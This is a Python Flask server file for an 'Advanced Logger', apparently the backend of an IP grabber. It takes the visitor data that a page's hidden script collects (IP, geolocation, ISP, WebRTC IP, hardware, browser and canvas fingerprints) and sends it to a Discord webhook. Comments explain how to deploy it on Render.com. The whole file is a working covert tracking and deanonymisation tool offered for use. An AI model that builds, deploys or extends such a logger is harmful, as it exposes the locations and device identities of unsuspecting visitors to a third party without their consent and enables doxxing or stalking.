# app.py

from flask import Flask, request, jsonify
import os
import requests

# Initialize the Flask application
app = Flask(__name__)

# Get the Discord Webhook URL from an environment variable for security
# On Render.com, you will set this in the "Environment" tab of your service.
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')

@app.route('/')
def index():
    """Serves the main HTML page."""
    # This will serve your index.html file from the same directory
    return app.send_static_file('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    """Receives data from the client and forwards it to Discord."""
    if not DISCORD_WEBHOOK_URL:
        print("ERROR: DISCORD_WEBHOOK_URL environment variable not set.")
        return jsonify({"status": "error", "message": "Server configuration error."}), 500

    # Get the JSON data sent from the client-side JavaScript
    data = request.json

    # Create a rich Discord embed for better readability
    embed = {
        "title": "🔍 Advanced User Logged",
        "description": f"A user from **{data.get('city', 'N/A')}** has been logged.",
        "color": 5814783, # A nice blue color
        "fields": [
            {
                "name": "📍 IP & Location",
                "value": f"**IP:** `{data.get('ip')}`\n**City:** {data.get('city')}\n**Region:** {data.get('region')}\n**Country:** {data.get('country')}\n**ISP:** {data.get('isp')}",
                "inline": True
            },
            {
                "name": "💻 Device & Browser",
                "value": f"**OS:** {data.get('os')} {data.get('osVersion')}\n**Browser:** {data.get('browser')} {data.get('browserVersion')}\n**Device:** {data.get('device')}",
                "inline": True
            },
            {
                "name": "🔧 Hardware",
                "value": f"**Screen:** {data.get('screenResolution')}\n**GPU:** {data.get('gpuVendor')} - {data.get('gpu')}\n**Memory:** {data.get('deviceMemory')} GB\n**Cores:** {data.get('hardwareConcurrency')}",
                "inline": False
            },
            {
                "name": "🌐 Network",
                "value": f"**WebRTC IP:** `{data.get('webrtcIP')}`\n**Connection:** {data.get('connectionType')}\n**Downlink:** {data.get('downlink')} Mbps",
                "inline": False
            },
            {
                "name": "🆔 Key Fingerprints",
                "value": f"**Fingerprint ID:** `{data.get('fingerprintId')}`\n**Canvas Hash:** `{data.get('canvasFingerprint')}`",
                "inline": False
            }
        ],
        "footer": {
            "text": f"Logged at {data.get('timestamp', 'N/A')}"
        }
    }

    # Prepare the payload for the Discord webhook
    discord_payload = {
        "username": "Advanced Logger",
        "embeds": [embed]
    }

    try:
        # Send the request to the Discord webhook
        response = requests.post(DISCORD_WEBHOOK_URL, json=discord_payload)
        response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
        print("Successfully sent log to Discord.")
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")
        return jsonify({"status": "error", "message": "Failed to send to Discord."}), 500

if __name__ == '__main__':
    # The host '0.0.0.0' makes it accessible from outside the container
    app.run(host='0.0.0.0', port=5000)
